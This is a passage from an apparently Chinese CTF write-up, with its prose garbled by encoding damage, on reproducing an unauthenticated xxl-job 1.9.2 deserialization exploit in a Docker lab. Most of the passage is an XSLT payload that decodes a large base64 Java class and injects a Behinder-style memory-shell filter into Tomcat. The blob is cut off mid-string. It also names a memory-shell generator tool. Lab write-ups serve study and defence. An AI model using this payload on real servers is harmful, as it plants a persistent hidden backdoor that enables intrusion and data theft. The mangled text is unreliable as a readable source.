sun.swing.SwingLazyValueï¼Œæ€ªäº†ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹adminç»„ä»¶çš„javaç‰ˆæœ¬</p><p>æˆ‘å»æ€ä¹ˆæ˜¯jdk21çš„ç‰ˆæœ¬çš„ğŸ˜“ï¼Œè¿™Tomcaté•œåƒç›´æ¥ç»™æˆ‘æ‹‰äº†ä¸€ä¸ª21çš„jdkï¼Œé‚£å°±æ”¹ä¸€ä¸‹adminçš„dockerfileï¼Œæ”¹æˆæ‰‹åŠ¨è£…tomcatå’Œjdkäº†</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># ä½¿ç”¨å®˜æ–¹Javaé•œåƒä½œä¸ºåŸºç¡€é•œåƒ</span><br><span class="hljs-keyword">FROM</span> dockerpull.org/openjdk:<span class="hljs-number">8</span>-jdk<br><br><span class="hljs-comment"># è®¾ç½®ç¯å¢ƒå˜é‡</span><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-comment"># å®‰è£…Tomcat</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget https://downloads.apache.org/tomcat/tomcat-9/v9.0.97/bin/apache-tomcat-9.0.97.tar.gz -O /tmp/tomcat.tar.gz \</span><br><span class="language-bash">    &amp;&amp; tar -xzf /tmp/tomcat.tar.gz -C /usr/local \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> /tmp/tomcat.tar.gz \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">ln</span> -s /usr/local/apache-tomcat-9.0.97 /usr/local/tomcat</span><br><br><span class="hljs-comment"># æ¸…ç†é»˜è®¤çš„Tomcatåº”ç”¨</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager</span><br><br><span class="hljs-comment"># è®¾ç½®æ—¶åŒº</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-comment"># æ·»åŠ ä½ çš„åº”ç”¨åˆ°Tomcatçš„webappsç›®å½•</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br><br><span class="hljs-comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf /tmp/*</span><br><br><span class="hljs-comment"># æš´éœ²Tomcatçš„ç«¯å£</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-comment"># å¯åŠ¨Tomcat</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> /usr/local/tomcat/bin/startup.sh &amp;&amp; <span class="hljs-built_in">tail</span> -F /usr/local/tomcat/logs/catalina.out</span><br></code></pre></td></tr></table></figure></blockquote><p>ç°åœ¨å†æ‰“ä¸€é</p><p><img src="https://cdn.clown2024.cn/image-20241127221633717.png" alt="image-20241127221633717"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸæ‰“è¿›å»äº†ï¼Œè¯æ˜expæ˜¯æ²¡é—®é¢˜çš„ï¼Œç°åœ¨å°±è¯¥è€ƒè™‘æ‰“ä»€ä¹ˆå†…å­˜é©¬äº†</p><blockquote><p>ç„¶åè¿™é‡Œæ‰“ç€æ‰“ç€çªç„¶å‘ç°äº†å¥‡æ€ªçš„é—®é¢˜ï¼Œæˆ‘ç°åœ¨æ‰“çš„æ˜¯apiçš„æœªæˆæƒï¼Œè€Œä¸”åˆæ˜¯åœ¨tomcatèµ·çš„æœåŠ¡ï¼Œæ€ä¹ˆwpæ‰“çš„æ˜¯jettyå†…å­˜é©¬å‘¢</p><p>åæ¥çœ‹äº†ä¸€ä¸‹é¢˜ç›®åªç»™äº†executorçš„ç«¯å£ï¼Œè€Œè¯¥ç‰ˆæœ¬çš„executorä¹Ÿæ˜¯å­˜åœ¨æœªæˆæƒæ‰“hessianååºåˆ—åŒ–çš„ï¼Œå…·ä½“çš„å¯ä»¥çœ‹ä¸€ä¸‹æ–‡ç« ï¼Œæ‰€ä»¥æˆ‘æ‰“åŠå¤©æ‰“é”™ç«¯å£äº†ğŸ˜¡ï¼Œé‚£ä¹Ÿå…ˆå¤ç°æ‰“ä¸€ä¸‹apiå§ï¼Œç­‰ä¼šå†æ‰“é¢˜ç›®çš„executoræœªæˆæƒ</p></blockquote><p>è¿™é‡Œç”¨ä¸€æ¬¾javaå†…å­˜é©¬ç”Ÿæˆå·¥å…·ï¼š<a href="https://github.com/pen4uin/java-memshell-generator-release">https://github.com/pen4uin/java-memshell-generator-release</a></p><p><img src="https://cdn.clown2024.cn/image-20241128173522354.png" alt="image-20241128173522354"></p><p>ç”Ÿæˆå¯¹åº”çš„å†°èå†…å­˜é©¬</p><p>ç„¶åxsltæ–‡ä»¶æ”¹æˆè¿™æ ·</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;yv66vgAAADEBsgEAG29yZy9qdW5pdC9tL0VuY3J5cHRpb25VdGlscwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAA1nZXRVcmxQYXR0ZXJuAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQACLyoIAAgBAAxnZXRDbGFzc05hbWUBAChjaC5xb3MubG9nYmFjay5Db250ZXh0TG9hZGVyQ2F5emJ2RmlsdGVyCAALAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwEAE2phdmEvaW8vSU9FeGNlcHRpb24HAA8BABBqYXZhL2xhbmcvU3RyaW5nBwARAQpESDRzSUFBQUFBQUFBLzZWWENYY1QxeFgrbmlWN1pGbUVJSUt4Z0FRbkthREZ0aEtNcVpFSmllVTR3WWx0VWlzMWRad3VZMmxrQ1dTTjBJd2NSSmVrNmI2blRiZDAzMGwzMGdZWkJ3SjBDdzFObTI3dXYwbFB2emNqeVpJc0c4N3BPZGFiZWUvZTk5Mzd2cnU4OGZYL3ZuSVp3TDM0ajRBL25ncWYwbzF3UnArZlUrTW53eU42MXRST20rTzZtdER5STJyeHpOemlRK21NcWVVVkNJRnRKOVJGTlp4UnMvUGhrWXhxR0xhYUFvZkFiVkowT214bytjV01ab1lybTFvRnhEdzMrbWVqZ2ZHRzNVTUN6aEU5b1Fsc0hrOW50Y25Dd3B5V2YxeWR5M0RGTzY3SDFjeTBtay9MZVhuUmFhYlNoa0J3L0dhZHBnVXhKOUF5R3hYb1NHaEpXckVzQzJ5blEyTmphMTN5NEZac2NjTUpyMERiNFhRMmJSNFJjUGdEMHg3Y2htMVMwQ213dzkrNHp6WTlGSmltd1RqUjE1RkxrQzRKc2xQQWxkQnRKd1ZtYmJ4VjltTDJjMG83VmRBTWMyZzlxWkhUczRiV0tMWlJSMUpxT21zNXRIWFZsOUhUY1MxbnB2V3NndDBDaXFFWkJpY0MzUTBRS2RQTWhZOXlpTmthNU5HaHo1MlFnYkxBQ21ZNkU1NVFjMXpmVnQ0YXp4ZHpwaDRlU2VkU051OWFSZFpnbXJKYmpMcnpDZHl4OGZscDE2Zy9zOER1RzVEQ2dDZFhpUkRZdVFGTHBDSmZjV1hmK2xRMCtPVEtWNTFwak4vYVRWV3Y5dHdVdklMOUFudHZEbFRCQVlGTk1aT1Z3SkNVUzhXZDBtVEdUYW9MVmpHdHhpRm01dFBaZVdiaTJ6SFlqaFljRW1pZjE4eWpsanB0K3RmcUJwcHRIOExoRHZUalB2SnNtNXBXTXdYTmcvdHQyQWNFYm0zY3BZQmw2SXF6V0VrNmEzQm5YUm1sMUh4TUhqNGIxNFlDVDNqd0lFYmRHTUZEUEF2OWkxVlM5UzUvNEViSjZzRlJqRW5uSGhIWXNwcXZSMVVqUllJVWpMc3hnVTRYK2toYlhUb3JlSXlKbmlzd0RRWnJmVHMyZDBLTGw4dXdiaVd3ZHNtREtjUTY4QTQ4N3NJOUx0ekpTaWk0OEM0MnJ4ejdnQWRQMlB6TU11azNQb2FDZDVNdE9tTVJ5OFJzRXBrbUhyRlJ2UmZ2NjhCN29QSXN3Nk14RitMbEh0QlFwQXFJMmtGdXg3S0dxWkoyZ2NDNjBXOHNjQS9ta1hJamlUUkxzVTdCeUdseFZtTThyNW1QYXNVWVp3cE84aVEwRkMyYUd1UHU5QWRtb3g0c0lDc0RyTnZOdUlsaHErZWVjaU1ESnFaVDltS3BPbVpyR2xxOGtFK2J4VENOV0tvbUN0S2Z4YnJFczFsUmNOcDJvTno4dC9xYk5mNHplTDhiUlh5QTNhWkJxT0JEYkZxVi9YWXZGL0N0UmFtMitXZndZVGVleHJOdWhwcTlmdGRHN1UzQngrd2FuQ3JYNEk0S2NGb1BSd3ZKcEpiWEVyYU15Si9BSnp2d2NYeEtvTE81am9MUFdMMUpUY2hMbFJlenYybjlmZzZmZCtPeitBSVBsdENqcXFFZFBQQ2dGcmR1NDg1bVdTQWo5a1Y4U1I3b2VmWkxlWGxsMVF3dlNYbXpTK0ZYOEZYSi85YzhVT0NTYWk4d3U3TGFVNnZaVmU5SnRWNitpVzlKcnI1TkxCS2laZ3o1dWRBa3M5a1R2b3Z2eVJCOW4rU3YyODBWL0ZEZ2dmL3ZScFg1ZER0KzNJRWY0U2ZzUDlXN3k2amNwbVI5N0ZqTmJmclROZVZjaHF6UitibEFhenlqbmpuRHJ0VGtVMGhKV1BUbjY5dDErZkRNLzBVMVA4Q0tOa3hxZEJxRmJOOUMyb2ozUllkam81WEk1VjM0TFhHU2VybnQ3N2xCTDY4ay9ubVVaQUNXQkR5MkQzWkN1YkJzNStXRVpxYjBSSlhVT3J6Wk5YaTFGdkphTWtQM3d6WUNUVjNFSlducVZZR3U5YlFVWEdFbXBMT0wra21lNFZDVFRKaTl5VWI4Ty96ZWphdjRnNExONWFiUUp6dDluNTN0THJ4bVh5MVY4djVNdXpZQkxseG5XMnZNb1hLUzZkbGtldDc2c3ZJa2ExWlk1UnZwV3dGbThQUWlmWm5iZjI5eTRFQmljT0RRb05yZmZ6RHV3dDhwbjlKa0dkT1JmOUtScWVTQ3NiRGd3cjl4SjJ2SkNTN0J3WkgzQjcvZGhieStyZWY5MXBOZjU3THNPTFp6ZGgvMVcvaHNENFljb2N0TDJIcU9reGE0T2JaUkJXeXJIUnc3YlNWNHNBbXczbTdCWnNxRi9OUXRRNDFTUis3WUhseml6L3VQODNneTZQM1hlVVNDM3BYekdINnBDdXkyd0xZVHRNc0M5OWpieXVBU3Nxc00rUmcxcFc1WE1MU0VYVGZHM0VtVVhUVU9kMVVkN29JUE95eUhiOGNkbEJGZFhPSVJwWldWMEZYMFI1dzlWekVRYWZVNWd5OGpzb3dqTFhnTkw5Yk0rREpjd3NNdjRIbXB2b3hIQlNKdEZ6RXhzNFRKaU9KVHZNZEN5M2luQThmNU91MXJyYjRmOTdXVjM5dThNd1I1Y2hsekRuZ1RGM0FpNHZLNVdpOGlZeTJYa1BNbWxtQ1U4TlJGdE13RVMvaGdDUjlad2tkOXJpQ1JQeTFRd25NbGZMbUVyNWZ3alJLKzQxTksrTUh4cytqb0RmVXM0NndEWjdFcDBsYVp2TVNqZW5BTjE5SE5aSkFVUFFJdng5MDhkRGNsZHlPTXR5R0NQYnhYOTJJUys1Z3VmamJsSUF5RWVNSDE0RG4wNGhMNmNJV2ExL2lKZEozL0JyNkIvVXl6QXhiRlNhSkc4Q3lUN2k1aWpyRFozazFFaFh1akpIc1BVK3dOL3ZZU3VVMlNYQTNGQ3UwRXJKQ3YwRnJJQ3RRSzdmWFN6emE4U1l0aEpxVUhyK01lV216RlFjcTN3UGtXcmlqb1Z6Q2dSQlYwdCtORkswVmI4RFA4Z21DOGIreW80aTJ1dHZKWjlMNThBUmNtZXJ5dk9GL0Ywek1PNzBpc2hNczlKSTd6NG93anhPa2ZyK0pQMWI5ekU5NXIzREhaNjMzZHdSMVVGbndXcVJWeCtwd01oL2N2dFVnKzUzbzQxdG1rN3hYbWQxZ01ESEk4eE5VSU9Semk3RERHV1g2U3lTT1V0SkdKWCtKWFBNUWdocTAzQitXOStEWE9rWTM5ZUpnUjNXZHhWYXd5V2NSdnFDMHNobGl0cDhpTFJZdHNBZDM4bVl5QVRjcUFWU2pNK2RXS3NjczdXbE10b2dvczhGZjhqV01GVERMOFpyWFFRNVpHRTdEUm1uS3VndjBQbkcyM3IwTVFBQUE9CAATAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAVABYKABIAFwEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABoBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAZmaWx0ZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAHUxvcmcvanVuaXQvbS9FbmNyeXB0aW9uVXRpbHM7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAJExqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEADmphdmEvdXRpbC9MaXN0BwAnAQASamF2YS91dGlsL0l0ZXJhdG9yBwApAQANU3RhY2tNYXBUYWJsZQwAFQAZCgAEACwBAApnZXRDb250ZXh0AQASKClMamF2YS91dGlsL0xpc3Q7DAAuAC8KAAIAMAEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAMgAzCwAoADQBAAdoYXNOZXh0AQADKClaDAA2ADcLACoAOAEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAOgA7CwAqADwBAAlnZXRGaWx0ZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAPgA/CgACAEABAAlhZGRGaWx0ZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAEIAQwoAAgBEAQAEa2V5MQEACGNoaWxkcmVuAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAA2tleQEAC2NoaWxkcmVuTWFwAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBQAQAQamF2YS9sYW5nL1RocmVhZAcAUgEAEWphdmEvdXRpbC9IYXNoTWFwBwBUAQATamF2YS91dGlsL0FycmF5TGlzdAcAVgoAVwAsAQAKZ2V0VGhyZWFkcwgAWQEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABbAFwKAAIAXQEAB2dldE5hbWUMAF8ABgoAUwBgAQAcQ29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3NvcggAYgEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABkAGUKABIAZgEABnRhcmdldAgAaAEABWdldEZWDABqAFwKAAIAawEABnRoaXMkMAgAbQgARwEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7DABwAHEKAFUAcgEADWphdmEvdXRpbC9TZXQHAHQLAHUANAEAA2dldAwAdwA/CgBVAHgBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAHoAewoABAB8AQAPamF2YS9sYW5nL0NsYXNzBwB+CgB/AGABAA9TdGFuZGFyZENvbnRleHQIAIEBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAIMAhAsAKACFAQAVVG9tY2F0RW1iZWRkZWRDb250ZXh0CACHAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAiQCKCgBTAIsBAAh0b1N0cmluZwwAjQAGCgB/AI4BABlQYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyCACQAQAfVG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcggAkgEACXJlc291cmNlcwgAlAgAIAEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uBwCXAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWDAAVAJkKAJgAmgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCcAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAngEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAKABAAlTaWduYXR1cmUBACYoKUxqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAE2phdmEvbGFuZy9UaHJvd2FibGUHAKQBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcArgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAsACxCgBTALIBAA5nZXRDbGFzc0xvYWRlcgwAtACKCgB/ALUMAAoABgoAAgC3AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAuQC6CgCvALsMAA0ABgoAAgC9AQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAvwDACgACAMEBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAwwDECgACAMUIAKgHAKcBABFqYXZhL2xhbmcvSW50ZWdlcgcAyQEABFRZUEUMAMsAqwkAygDMAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADOAM8KAH8A0AEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA0gEADXNldEFjY2Vzc2libGUBAAQoWilWDADUANUKANMA1gEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADYANkKAMoA2gEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA3ADdCgDTAN4BAAtuZXdJbnN0YW5jZQwA4AA7CgB/AOEBAA1nZXRGaWx0ZXJOYW1lAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxsYXN0RG90SW5kZXgBAAFJAQAJY2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQABLggA6QEAC2xhc3RJbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJDADrAOwKABIA7QEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwwA7wDwCgASAPEBAAlmaWx0ZXJEZWYBAAlmaWx0ZXJNYXABAAJlMgEADGNvbnN0cnVjdG9ycwEAIFtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAMZmlsdGVyQ29uZmlnAQANZmlsdGVyQ29uZmlncwEAD0xqYXZhL3V0aWwvTWFwOwEADmNhdGFsaW5hTG9hZGVyAQAPZmlsdGVyQ2xhc3NOYW1lAQAKZmlsdGVyTmFtZQEAI1tMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I8Kj47BwD3AQARZ2V0Q2F0YWxpbmFMb2FkZXIMAQAAigoAAgEBDADjAOQKAAIBAwEADWZpbmRGaWx0ZXJEZWYIAQUBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAFsBBwoAAgEIAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJEZWYIAQoBAAdmb3JOYW1lDAEMALoKAH8BDQEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyTWFwCAEPAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyRGVmCAERAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyTWFwCAETAQA9KExqYXZhL2xhbmcvU3RyaW5nO1pMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylMamF2YS9sYW5nL0NsYXNzOwwBDAEVCgB/ARYBAA1zZXRGaWx0ZXJOYW1lCAEYAQAOc2V0RmlsdGVyQ2xhc3MIARoBAAxhZGRGaWx0ZXJEZWYIARwBAA1zZXREaXNwYXRjaGVyCAEeAQAHUkVRVUVTVAgBIAEADWFkZFVSTFBhdHRlcm4IASIMAAUABgoAAgEkAQAwb3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLkFwcGxpY2F0aW9uRmlsdGVyQ29uZmlnCAEmAQAXZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcnMBACIoKVtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7DAEoASkKAH8BKgEADXNldFVSTFBhdHRlcm4IASwBABJhZGRGaWx0ZXJNYXBCZWZvcmUIAS4BAAxhZGRGaWx0ZXJNYXAIATABAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgcBMgoBMwDWAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADgATUKATMBNggA+QEADWphdmEvdXRpbC9NYXAHATkBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBOwE8CwE6AT0BAA9wcmludFN0YWNrVHJhY2UMAT8AGQoAGwFAAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAUIBACBqYXZhL2xhbmcvSW5zdGFudGlhdGlvbkV4Y2VwdGlvbgcBRAEAAWkBAAxkZWNvZGVyQ2xhc3MBAAdkZWNvZGVyAQAHaWdub3JlZAEACWJhc2U2NFN0cgEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggBTAEADGRlY29kZUJ1ZmZlcggBTgEACWdldE1ldGhvZAwBUADPCgB/AVEBABBqYXZhLnV0aWwuQmFzZTY0CAFTAQAKZ2V0RGVjb2RlcggBVQEABmRlY29kZQgBVwEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBYgEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0HAWQBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQcBZgoBYwAsAQAFKFtCKVYMABUBaQoBZQFqAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAVAWwKAWcBbQEABHJlYWQBAAUoW0IpSQwBbwFwCgFnAXEBAAV3cml0ZQEAByhbQklJKVYMAXMBdAoBYwF1AQALdG9CeXRlQXJyYXkBAAQoKVtCDAF3AXgKAWMBeQEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAX8BgAoAAgGBAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAYMKAYQA1goBhAB4AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwGHAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAGKAYsKAH8BjAEADWdldFN1cGVyY2xhc3MMAY4AewoAfwGPCgGIABcBAAx0YXJnZXRPYmplY3QBAAptZXRob2ROYW1lAQAHbWV0aG9kcwEAG1tMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAApwYXJhbUNsYXp6AQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAFcGFyYW0BABNbTGphdmEvbGFuZy9PYmplY3Q7AQAGbWV0aG9kAQAJdGVtcENsYXNzBwGVAQASZ2V0RGVjbGFyZWRNZXRob2RzAQAdKClbTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAZ8BoAoAfwGhCgDTAGABAAZlcXVhbHMMAaQAhAoAEgGlAQARZ2V0UGFyYW1ldGVyVHlwZXMBABQoKVtMamF2YS9sYW5nL0NsYXNzOwwBpwGoCgDTAakKAJ8AFwEACmdldE1lc3NhZ2UMAawABgoAnQGtCgCYABcBAAg8Y2xpbml0PgoAAgAsACEAAgAEAAAAAAAQAAEABQAGAAEABwAAAA8AAQABAAAAAxIJsAAAAAAAAQAKAAYAAQAHAAAAEAABAAEAAAAEEwAMsAAAAAAAAQANAAYAAgAOAAAABAABABAABwAAABcAAwABAAAAC7sAElkTABS3ABiwAAAAAAABABUAGQABAAcAAADYAAMABQAAADYqtwAtKrYAMUwruQA1AQBNLLkAOQEAmQAbLLkAPQEATiottwBBOgQqLRkEtgBFp//ipwAETLEAAQAEADEANAAbAAQAHAAAACYACQAAACwABAAuAAkALwAgADAAJwAxAC4AMgAxADUANAAzADUAOAAdAAAAKgAEACcABwAeAB8ABAAgAA4AIAAfAAMACQAoACEAIgABAAAANgAjACQAAAAlAAAADAABAAkAKAAhACYAAQArAAAAGgAE/wAQAAMHAAIHACgHACoAAPkAIEIHABsAAAEALgAvAAMABwAAAtgAAwAOAAABebsAV1m3AFhMElMSWrgAXsAAUcAAUU0BTiw6BBkEvjYFAzYGFQYVBaIBQRkEFQYyOgcZB7YAYRJjtgBnmQCzLccArxkHEmm4AGwSbrgAbBJvuABswABVOggZCLYAc7kAdgEAOgkZCbkAOQEAmQCAGQm5AD0BADoKGQgZCrYAeRJvuABswABVOgsZC7YAc7kAdgEAOgwZDLkAOQEAmQBNGQy5AD0BADoNGQsZDbYAeU4txgAaLbYAfbYAgBKCtgBnmQALKy25AIYCAFctxgAaLbYAfbYAgBKItgBnmQALKy25AIYCAFen/6+n/3ynAHcZB7YAjMYAbxkHtgCMtgB9tgCPEpG2AGeaABYZB7YAjLYAfbYAjxKTtgBnmQBJGQe2AIwSlbgAbBKWuABsTi3GABottgB9tgCAEoK2AGeZAAsr